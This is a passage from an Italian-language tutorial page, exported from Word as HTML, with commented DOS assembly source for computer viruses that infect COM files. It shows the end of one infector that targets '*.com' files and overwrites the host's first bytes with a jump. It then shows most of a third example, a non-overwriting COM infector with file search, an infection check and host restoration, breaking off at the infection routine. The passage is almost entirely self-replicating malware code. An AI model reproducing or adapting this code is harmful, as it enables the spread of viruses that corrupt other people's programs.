style="mso-spacerun: yes">     </span>cx,end_virus-start<span
style="mso-spacerun: yes">                </span>; quantità di bytes codice
virale<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>lea<span
style="mso-spacerun: yes">     </span>dx,[bp+start]<span style="mso-spacerun:
yes">                     </span>; scriviamo da questo indirizzo<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>int<span
style="mso-spacerun: yes">     </span>21<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>ax,4200<span style="mso-spacerun:
yes">     </span><span style="mso-spacerun: yes">                      </span>;
vai alla fine file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>sub<span style="mso-spacerun: yes">     </span>cx,cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>cwd<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>int<span style="mso-spacerun: yes">     </span>21<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>ah,40h<span style="mso-spacerun:
yes">                            </span>; scriviamo l’istruzione di salto<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>cx,4<span style="mso-spacerun:
yes">                              </span>; ricoprendo I primi 4 bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>lea<span
style="mso-spacerun: yes">     </span>dx,[bp+salta_bytes]<span
style="mso-spacerun: yes">               </span>; del programma ospitante <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>int<span
style="mso-spacerun: yes">     </span>21<span style="mso-spacerun:
yes">                                </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>chiudi:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>ah,3eh<span style="mso-spacerun:
yes">                            </span>; chiudo il file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>int<span
style="mso-spacerun: yes">     </span>21<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>ancora:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>ah,4fh<span style="mso-spacerun:
yes">                            </span>; trova il prossimo<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>jmp<span style="mso-spacerun: yes">     </span>find_next<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>reset_DTA:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>dx,80h<span
style="mso-spacerun: yes">                            </span>; ripristina il
DTA originario<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>ah,1ah<span style="mso-spacerun:
yes">                            </span>; del COM ospitante<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>int<span
style="mso-spacerun: yes">  </span><span style="mso-spacerun: yes">   </span>21<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>mov<span
style="mso-spacerun: yes">     </span>di,100h<span style="mso-spacerun:
yes">                          </span>; ritorna al programma ospitante<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>push<span
style="mso-spacerun: yes">    </span>di<span style="mso-spacerun:
yes">                               </span>; rilasciandogli il controllo<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>ret<span
style="mso-spacerun: yes">                                      </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes"> </span>find_files<span
style="mso-spacerun: yes">      </span>db<span style="mso-spacerun: yes">     
</span>'*.com',0<span style="mso-spacerun: yes">                </span>; le
nostre vittime<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>salta_bytes<span style="mso-spacerun: yes">      </span>db<span
style="mso-spacerun: yes">      </span>0e9,0,0,'V'<span style="mso-spacerun:
yes">              </span>; il nostro JMP<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>salva_bytes:<span style="mso-spacerun: yes">          </span>; I
primi 4 bytes dell’HOST vanno salvati qui<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>nop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>nop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>nop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>nop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">        </span>int<span
style="mso-spacerun: yes">     </span>20<span style="mso-spacerun: yes">   
</span>; ritorna al prompt<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>end_virus:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>end start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;***********************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>III° Esempio<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>205 - Virus COM-infettore non sovrascrittore.<o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>.model tiny<span style="mso-spacerun: yes">                  
</span>; modello di meoria<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>.code<span style="mso-spacerun: yes">                      
</span><span style="mso-spacerun: yes">  </span>; inizio codice<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>org
100h<span style="mso-spacerun: yes">                      </span>; inizio del
COM <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>MAIN:<span style="mso-spacerun:
yes">             </span>db 0e9h,00h,00h<span style="mso-spacerun:
yes">               </span>; Jmp START_VIRUS<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>START_VIRUS<span style="mso-spacerun: yes">       </span>proc
near<span style="mso-spacerun: yes">                     </span>; inizio reale
di Virus<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>call FIND_OFFSET<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>FIND_OFFSET:<span style="mso-spacerun:
yes">      </span>pop bp<span style="mso-spacerun: yes">                       
</span>; trovo il delta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                  </span>sub bp, offset FIND_OFFSET<span
style="mso-spacerun: yes">    </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; ripristino I tre bytes del programma ospitante, così dopo le
operazioni del virus <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; potrà riprendere correttamente il controllo<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">   </span><span
style="mso-spacerun: yes">               </span>lea si,[bp+ORIG_START]<span
style="mso-spacerun: yes">        </span>; ripristino i 3 bytes originari<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
di,100h<span style="mso-spacerun: yes">                   </span>; a 100h,
inizio del file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>push
di<span style="mso-spacerun: yes">                       </span>; copio da si a
di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>movsw<span style="mso-spacerun: yes">              </span><span
style="mso-spacerun: yes">           </span>; copio una word (2 bytes)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                  </span></span></b><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>movsb<span style="mso-spacerun:
yes">                         </span>; copio un byte<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; Cambiamo l’indirizzo del DTA da quello di default così le
funzioni <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; FINDFIRST/FINDNEXT non distruggono l’originale. il nostro DTA
Lo salviamo in <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; NEW_DTA (43)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>lea
dx,[bp+NEW_DTA]<span style="mso-spacerun: yes">           </span>; Punta alla
nuova area DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>call
SET_DTA<span style="mso-spacerun: yes">                  </span>; setta il DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; routine di ricerca Findfirst / Findnext <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>FINDFIRST:<span style="mso-spacerun: yes">        </span>mov
ah,4eh<span style="mso-spacerun: yes">                    </span>; funzione DOS
trova il primo<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>lea
dx,[bp+COM_MASK]<span style="mso-spacerun: yes">          </span>; cerchiamo
ogni file COM<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>xor
cx,cx<span style="mso-spacerun: yes">                     </span>; azzero cx.
Ogni tipo di file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>FINDNEXT:<span style="mso-spacerun:
yes">         </span>int 21h<span style="mso-spacerun:
yes">                       </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                  </span></span></b><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>jc QUIT<span style="mso-spacerun: yes">       
</span><span style="mso-spacerun: yes">               </span>; se ci sono
errori o non ci sono<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun:
yes">                                                </span>; più files, esci<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; Ok abbiamo trovato una possibile vittima. Apriamo il file e
vediamo se è già <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; stato infettato.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
ax,3d00h<span style="mso-spacerun: yes">          </span><span
style="mso-spacerun: yes">        </span>; apro il file, solo lettura<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>lea
dx,[bp+NEW_DTA+30]<span style="mso-spacerun: yes">        </span>; punta al
nome del file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>int
21h<span style="mso-spacerun: yes">                       </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>xchg
ax,bx<span style="mso-spacerun: yes">                    </span>; mettiamo
l’handle del file in BX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; il controllo viene eseguito non con un marcatore ma
confrontando le dimensioni:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
ah,3fh<span style="mso-spacerun: yes">                    </span>; leggo il
file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>lea
dx,[bp+ORIG_START]<span style="mso-spacerun: yes">        </span>; salvo qui i
primi tre bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
cx,3<span style="mso-spacerun: yes">     </span><span style="mso-spacerun:
yes">                 </span>; devo leggere 3 bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>int
21h<span style="mso-spacerun: yes">                       </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
ax,word ptr [bp+NEW_DTA+26]<span style="mso-spacerun: yes">   </span>; misura
del file in AX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
cx,word ptr [bp+ORIG_START+1] ; punta all’inizio del file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">         </span><span
style="mso-spacerun: yes">         </span></span></b><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>add cx,END_VIRUS-START_VIRUS+3; aggiunge misura file+3 bytes JMP<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                  </span></span></b><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>cmp ax,cx<span style="mso-spacerun:
yes">                     </span>; sono uguali ?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>jnz
INFECT_COM<span style="mso-spacerun: yes">                </span>; no,
infettalo<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
ah,3eh<span style="mso-spacerun: yes">                    </span>; si, chiudi e
cerca<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>int
21h<span style="mso-spacerun: yes">                       </span>; un’altraa
possibile vittima<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span>mov
ah,4fh<span style="mso-spacerun: yes">                    </span>; trova il
prossimo file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>jmp short FINDNEXT<span style="mso-spacerun: yes">            </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; ripristina il DTA di default<span style="mso-spacerun: yes"> 
</span>e ritorna il controllo all’ospitante.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>QUIT:<span style="mso-spacerun: yes">             </span>mov
dx,80h<span style="mso-spacerun: yes">                    </span>; Ripristina
DTA originale<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                  </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>call SET_DTA<span style="mso-spacerun: yes">                  </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                  </span></span></b><b><span style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>retn<span style="mso-spacerun:
yes">                          </span>; End Virus e inizio <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; dell’host. Ricorda, il registro DI contiene 100h che era stato
inserito nello <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>; stack.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>;*** Subroutine INFECT_COM ***<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>INFECT_COM:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; resetta gli attributei del file a ”normal” così possiamo
scriverci<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

